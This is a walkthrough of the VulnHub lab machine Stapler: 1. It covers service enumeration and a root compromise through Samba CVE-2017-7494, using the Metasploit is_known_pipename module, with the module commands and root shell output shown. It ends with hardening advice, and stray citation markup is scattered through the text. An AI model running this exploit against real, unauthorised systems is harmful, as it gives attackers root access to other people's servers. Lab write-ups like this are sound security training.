# Stapler: 1 (VulnHub)

## Overview

**Stapler: 1** is a Medium-difficulty VulnHub machine created by **g0tmi1k**. The machine contains multiple exposed services, legacy software, and intentional misconfigurations designed to encourage comprehensive enumeration and vulnerability assessment.

The primary attack path leverages an outdated Samba installation vulnerable to **CVE-2017-7494 (is_known_pipename)**, allowing unauthenticated remote code execution and direct root access. :contentReference[oaicite:0]{index=0}

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Stapler: 1 |
| Author | g0tmi1k |
| Platform | VulnHub |
| Release Date | 8 June 2016 |
| Difficulty | Medium |
| Target OS | Ubuntu Linux |
| Objective | Gain Root Access and Capture the Flag |

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- DNS Enumeration
- Samba Enumeration
- MySQL Enumeration
- Web Enumeration
- Vulnerability Research
- Searchsploit Usage
- CVE Analysis
- Metasploit Exploitation
- Remote Code Execution
- Linux Post-Exploitation
- Root Enumeration

## Tools Used

- Netdiscover
- Nmap
- FTP Client
- Searchsploit
- Metasploit Framework
- Samba Enumeration Tools
- Linux Commands

## Attack Methodology

1. Discover the target machine on the network.
2. Enumerate all exposed services using Nmap.
3. Identify Samba version information.
4. Research public vulnerabilities.
5. Discover CVE-2017-7494 affecting Samba 4.3.9.
6. Load the Metasploit Samba exploit module.
7. Configure the exploit against the target.
8. Execute remote code execution attack.
9. Obtain a remote shell.
10. Verify root privileges.
11. Enumerate the root directory.
12. Capture the flag.

## Open Services Identified

| Port | Service |
|--------|---------|
| 21 | FTP |
| 22 | SSH |
| 53 | DNS |
| 80 | HTTP |
| 139 | Samba |
| 666 | Unknown Service |
| 3306 | MySQL |
| 12380 | HTTP |

### Key Findings

- Anonymous FTP access enabled.
- Samba 4.3.9 exposed.
- MySQL accessible externally.
- Multiple web services running.
- Large attack surface available. :contentReference[oaicite:1]{index=1}

## Vulnerabilities Identified

### 1. Outdated Samba Service

```text
Samba 4.3.9
```

Affected by:

```text
CVE-2017-7494
```

The vulnerability allows remote code execution through arbitrary shared library loading. :contentReference[oaicite:2]{index=2}

### 2. Excessive Service Exposure

The host exposes multiple services simultaneously:

- FTP
- SSH
- DNS
- Samba
- MySQL
- Multiple Web Servers

This significantly increases the attack surface. :contentReference[oaicite:3]{index=3}

### 3. Writable Samba Share

The Samba exploit relies on uploading a malicious shared object into a writable share and forcing Samba to load it. :contentReference[oaicite:4]{index=4}

## Service Enumeration

### FTP Enumeration

Anonymous authentication was enabled:

```bash
ftp 192.168.10.16
```

However, directory listing was restricted:

```bash
PASV failed: 550 Permission denied
```

No useful information was obtained. :contentReference[oaicite:5]{index=5}

### Web Enumeration

Port 80 returned a basic 404 page.

Port 12380 revealed:

```text
Tim, we need to-do better next year for Initech
```

No direct attack path was identified through the web applications. :contentReference[oaicite:6]{index=6}

## Exploitation

### Vulnerability Discovery

Researching Samba 4.3.9 with Searchsploit revealed:

```bash
searchsploit samba 4.3.9
```

Result:

```text
Samba is_known_pipename() Arbitrary Module Load
```

Mapped to:

```text
CVE-2017-7494
```

:contentReference[oaicite:7]{index=7}

### Metasploit Exploitation

Load the exploit module:

```bash
use exploit/linux/samba/is_known_pipename
```

Configure the target:

```bash
set RHOSTS 192.168.10.16
set RPORT 139
```

Execute:

```bash
exploit
```

Metasploit uploaded a malicious shared object and successfully triggered code execution through Samba. :contentReference[oaicite:8]{index=8}

## Initial Access

After exploitation:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

Verify:

```bash
whoami
```

Output:

```text
root
```

The vulnerability provided immediate root access without requiring privilege escalation. :contentReference[oaicite:9]{index=9}

## Flag Capture

Navigate to:

```bash
cd /root
```

Files discovered:

```text
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
```

Read the flag:

```bash
cat flag.txt
```

Root compromise successfully achieved. :contentReference[oaicite:10]{index=10}

## Attack Chain Summary

- Network Discovery using Netdiscover
- Service Enumeration using Nmap
- Samba Version Identification
- Vulnerability Research
- Discovery of CVE-2017-7494
- Metasploit Samba Exploitation
- Remote Code Execution
- Direct Root Shell
- Flag Retrieval

## Security Recommendations

- Upgrade Samba to a supported version.
- Patch systems vulnerable to CVE-2017-7494.
- Restrict writable network shares.
- Minimize exposed services.
- Disable unnecessary services.
- Implement network segmentation.
- Perform regular vulnerability assessments.
- Continuously monitor exposed infrastructure.

## Key Learning Outcomes

- Thorough enumeration often reveals the quickest attack path.
- Version detection is critical during reconnaissance.
- Legacy software frequently contains public exploits.
- Samba misconfigurations can lead directly to system compromise.
- Public CVEs should always be investigated during assessments.
- Excessive service exposure increases organizational risk.

## Conclusion

Stapler: 1 is an excellent VulnHub machine for learning service enumeration, vulnerability assessment, CVE research, and remote code execution. By identifying an outdated Samba service and exploiting CVE-2017-7494, full root access was obtained without requiring any privilege escalation. :contentReference[oaicite:11]{index=11}

---

**Author:** Omkar Babaji Sawant  
**Repository:** VulnHub-Walkthroughs
